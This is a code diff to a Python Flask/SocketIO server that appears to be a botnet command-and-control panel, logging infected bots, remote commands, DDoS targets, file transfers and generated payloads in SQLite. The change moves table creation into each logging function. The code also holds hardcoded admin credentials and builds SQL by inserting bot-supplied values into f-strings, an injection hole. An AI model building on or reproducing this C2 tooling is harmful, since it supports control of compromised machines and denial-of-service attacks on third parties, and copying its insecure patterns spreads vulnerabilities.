@@ -9,15 +9,6 @@ app = Flask(__name__)
 server = SocketIO(app, max_http_buffer_size=MAX_BUFFER_SIZE)
 app.secret_key = 'Fixer'
 
-events = sqlite3.connect("Events.db")
-if not os.path.exists("Events.db"):
-    events.execute("Create table Bots (bot_id INT AUTO_INCREMENT PRIMARY KEY, hostname VARCHAR(50), ip_address VARCHAR(15), os VRACHAR(50), status VARCHAR(5))")
-    events.execute("Create table Modules (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), status VARCHAR(150))")
-    events.execute("Create table Commands (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), output VARCHAR(20))")
-    events.execute("Create table DDOS_Attacks (serial_no INT AUTO_INCREMENT PRIMARY KEY, target VRACHAR(15))")
-    events.execute("Create table File_Transfer (bot_id INT PRIMARY KEY, hostname VARCHAR(50), transfer_type VRACHAR(80), filename VARCHAR(350), status VARCHAR(250))")
-    events.execute("Create table Payloads (serial_no INT AUTO_INCREMENT PRIMARY KEY, server_ip VARCHAR(15), port VARCHAR(5), force_convert VARCHAR(5))")
-
 USERNAME = 'admin'
 PASSWORD = 'admin9876'
 server_ip = '0.0.0.0'
@@ -97,8 +88,8 @@ def pytoexe():
 
 def eventlog_for_payload(payload_ip, payload_port, force_convert):
     events = sqlite3.connect("Events.db")
-    insert = f'''insert into Payloads (server_ip, port, force_convert) VALUES ("{payload_ip}", "{payload_port}", "{force_convert}")'''
-    events.execute(insert)
+    events.execute("CREATE TABLE IF NOT EXISTS Payloads (serial_no INT AUTO_INCREMENT PRIMARY KEY, server_ip VARCHAR(15), port VARCHAR(5), force_convert VARCHAR(5))")
+    events.execute(f'''insert into Payloads (server_ip, port, force_convert) VALUES ("{payload_ip}", "{payload_port}", "{force_convert}")''')
     events.commit()
     events.close()
 
@@ -131,8 +122,8 @@ def handle_modules_output(module_output):
     status = module_output.get('result')
     completedTasks.append({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': status})
     events = sqlite3.connect("Events.db")
-    insert = f'''insert into Modules (bot_id, hostname, command, status) VALUES ("{idNumber}", "{hostname}", "{command}", "{status}")'''
-    events.execute(insert)
+    events.execute("CREATE TABLE IF NOT EXISTS Modules (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), status VARCHAR(150))")
+    events.execute(f'''insert into Modules (bot_id, hostname, command, status) VALUES ("{idNumber}", "{hostname}", "{command}", "{status}")''')
     events.commit()
     events.close()
 
@@ -164,8 +155,8 @@ def handle_commands_output(output):
     command = output.get('command')
     command_output = output.get('output')
     events = sqlite3.connect("Events.db")
-    insert = f'''insert into Commands (bot_id, hostname, command, output) VALUES ("{idNumber}", "{hostname}", "{command}", "RECEIVED / FAILED")'''
-    events.execute(insert)
+    events.execute("CREATE TABLE IF NOT EXISTS Commands (bot_id INT PRIMARY KEY, hostname VARCHAR(50), command VRACHAR(80), output VARCHAR(20))")
+    events.execute(f'''insert into Commands (bot_id, hostname, command, output) VALUES ("{idNumber}", "{hostname}", "{command}", "RECEIVED / FAILED")''')
     events.commit()
     events.close()
 
@@ -194,8 +185,8 @@ def handle_ping_output(ping_output):
         hostname = client_info.hostname
         ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'target': target, 'output': output})
         events = sqlite3.connect("Events.db")
-        insert = f'''insert into DDOS_Attacks (target) VALUES ("{target}")'''
-        events.execute(insert)
+        events.execute("CREATE TABLE IF NOT EXISTS DDOS_Attacks (serial_no INT AUTO_INCREMENT PRIMARY KEY, target VRACHAR(15))")
+        events.execute(f'''insert into DDOS_Attacks (target) VALUES ("{target}")''')
         events.commit()
         events.close()
 
@@ -230,8 +221,8 @@ def file_status_update(file_status):
     status = file_status.get('status')
     file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
     events = sqlite3.connect("Events.db")
-    insert = f'''insert into File_Transfer (bot_id, hostname, transfer_type, filename, status) VALUES ("{idNumber}", "{hostname}", "{transfer_type}", "{file_name}", "{status}")'''
-    events.execute(insert)
+    events.execute("CREATE TABLE IF NOT EXISTS File_Transfer (bot_id INT PRIMARY KEY, hostname VARCHAR(50), transfer_type VRACHAR(80), filename VARCHAR(350), status VARCHAR(250))")
+    events.execute(f'''insert into File_Transfer (bot_id, hostname, transfer_type, filename, status) VALUES ("{idNumber}", "{hostname}", "{transfer_type}", "{file_name}", "{status}")''')
     events.commit()
     events.close()
 
@@ -303,8 +294,8 @@ def handleInformation(Initial_Information):
     operating_system = Initial_Information.get("OS")
     ip = Initial_Information.get("IP")
     events = sqlite3.connect("Events.db")
-    insert = f'''insert into Bots (hostname, ip_address, os, status) VALUES ("{hostname}", "{ip}", "{operating_system}", "Alive")'''
-    events.execute(insert)
+    events.execute("CREATE TABLE IF NOT EXISTS Bots (bot_id INT AUTO_INCREMENT PRIMARY KEY, hostname VARCHAR(50), ip_address VARCHAR(15), os VRACHAR(50), status VARCHAR(5))")
+    events.execute(f'''insert into Bots (hostname, ip_address, os, status) VALUES ("{hostname}", "{ip}", "{operating_system}", "Alive")''')
     events.commit()
     events.close()
 
